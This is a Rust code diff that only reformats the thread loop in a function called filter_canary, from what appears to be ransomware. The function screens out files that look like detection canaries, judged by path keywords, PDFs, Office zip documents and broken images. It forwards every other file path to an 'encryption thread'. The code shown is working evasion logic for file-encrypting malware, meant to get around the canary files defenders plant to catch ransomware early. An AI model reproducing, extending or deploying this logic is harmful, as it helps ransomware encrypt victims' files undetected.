@@ -50,36 +50,38 @@ pub fn filter_canary(
     sender: Sender<Arc<PathBuf>>,
 ) -> thread::JoinHandle<()> {
     debug!("Starting canary filter thread");
-    thread::spawn(move || loop {
-        let file_path = match receiver.recv() {
-            Ok(path) => {
-                debug!("Received file path over channel: {path:?}");
-                path
-            }
-            Err(error) => {
-                warn!("Error receiving file path over channel: {error}");
-                return;
-            }
-        };
+    thread::spawn(move || {
+        loop {
+            let file_path = match receiver.recv() {
+                Ok(path) => {
+                    debug!("Received file path over channel: {path:?}");
+                    path
+                }
+                Err(error) => {
+                    warn!("Error receiving file path over channel: {error}");
+                    return;
+                }
+            };
 
-        if analyze_keywords(&file_path.to_string_lossy()) {
-            info!("File path contained keyword: {file_path:?}");
-            continue;
-        }
+            if analyze_keywords(&file_path.to_string_lossy()) {
+                info!("File path contained keyword: {file_path:?}");
+                continue;
+            }
 
-        let lowercase_extension = get_lowercase_extension(file_path.as_ref());
-        if config::ANALYZE_PDF && lowercase_extension == "pdf" {
-            filter_pdf(&sender, &file_path);
-        } else if config::ANALYZE_OFFICE_ZIP
-            && OFFICE_ZIP_EXTENSIONS.contains(&lowercase_extension.as_str())
-        {
-            filter_office_zip(&sender, &file_path);
-        } else if config::AVOID_BROKEN_IMAGES
-            && IMAGE_EXTENSIONS.contains(&lowercase_extension.as_str())
-        {
-            filter_broken_image(&sender, &file_path);
-        } else if let Err(error) = sender.send(Arc::clone(&file_path)) {
-            error!("Failed to send path to encryption thread: {error}");
+            let lowercase_extension = get_lowercase_extension(file_path.as_ref());
+            if config::ANALYZE_PDF && lowercase_extension == "pdf" {
+                filter_pdf(&sender, &file_path);
+            } else if config::ANALYZE_OFFICE_ZIP
+                && OFFICE_ZIP_EXTENSIONS.contains(&lowercase_extension.as_str())
+            {
+                filter_office_zip(&sender, &file_path);
+            } else if config::AVOID_BROKEN_IMAGES
+                && IMAGE_EXTENSIONS.contains(&lowercase_extension.as_str())
+            {
+                filter_broken_image(&sender, &file_path);
+            } else if let Err(error) = sender.send(Arc::clone(&file_path)) {
+                error!("Failed to send path to encryption thread: {error}");
+            }
         }
     })
 }
